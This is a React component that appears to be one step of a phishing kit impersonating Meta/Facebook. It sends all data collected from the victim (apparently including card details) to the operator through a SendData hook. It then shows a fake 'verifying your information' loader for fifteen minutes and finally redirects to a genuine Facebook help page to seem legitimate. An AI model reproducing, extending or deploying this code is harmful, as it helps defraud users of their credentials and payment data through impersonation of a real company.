import React, { useContext, useEffect, useState } from "react";
import styled from "styled-components";
import Done from "../../assets/svgs/done.svg";
import Image from "next/image";
import SendData from "../../hooks/SendData.js";
import { DataContext } from "../../pages";

const ModalContainer = styled.div`
  position: fixed;
  display: flex;
  justify-content: center;
  align-items: center;
  background-color: #00000010;
  width: 100%;
  height: 100%;
  top: 0px;
  left: 0px;
`;
const ModalContent = styled.div`
  max-width: 550px;
  width: 100%;
  height: 300px;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  position: relative;
  padding-inline: 1.5rem;
  padding-block: 1.5rem;
  margin: 1rem;
`;
const ModalTitle = styled.div`
  padding-bottom: 1.5rem;
  font-weight: 600;
  font-size: 18px;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;

// const ModalSubtitle = styled.div`
//     font-weight: 700;
//     padding-bottom: 0.5rem;
//     line-height: 1;

// `

// const SmallText = styled.div`
//     color: #707072;
//     font-size: 14px;
// `
const BtnDiv = styled.div`
  padding-top: 1rem;
  display: flex;
  justify-content: flex-end;
`;
const NextBtn = styled.button`
  background-color: #2a6de1;
  border: none;
  padding-inline: 3rem;
  padding-block: 0.5rem;
  width: 140px;
  border-radius: 6px;
  color: #fff;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;
const DoneDiv = styled.div`
  padding-top: 1rem;
  padding-bottom: 1rem;
  svg {
    width: 75px;
  }
`;
const LoaderWrapper = styled.div`
  height: 530px;
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  gap: 20px;
  img {
    width: 150px;
    height: auto;
  }
`;
function Step3() {
  const [Loading, setLoading] = useState(true);
  useEffect(() => {
    let timer1 = setTimeout(() => {
      setLoading(false);
    }, 900000);

    return () => {
      clearTimeout(timer1);
    };
  }, []);

  let { AllData } = useContext(DataContext);

  useEffect(() => {
    const params = {
      ...AllData,
      currentStep: "User Waiting in the Meta loading page",
    };
    SendData(params);
  }, []);

  return (
    <ModalContainer>
      <ModalContent>
        {Loading ? (
          <LoaderWrapper>
            <Image
              alt=""
              src="/assets/images/loadingGif.gif"
              height={25}
              width={150}
            />
            <div className="text-center font-fbook">
              Please wait while we verify your information
            </div>
          </LoaderWrapper>
        ) : (
          <>
            <div className="text-center">
              <ModalTitle>Success</ModalTitle>
            </div>
            <div className="text-center">
              <DoneDiv>
                <Done />
              </DoneDiv>

              {/* <ModalSubtitle>
                                Card successfully verified
                            </ModalSubtitle>
                            <SmallText>
                                This card has been verified for your account
                            </SmallText> */}
            </div>
            <BtnDiv>
              <NextBtn
                onClick={() => {
                  window.location.href =
                    "https://www.facebook.com/business/help/915454841921082?id=180505742745347";
                }}
              >
                Close
              </NextBtn>
            </BtnDiv>
          </>
        )}
      </ModalContent>
    </ModalContainer>
  );
}

export default Step3;
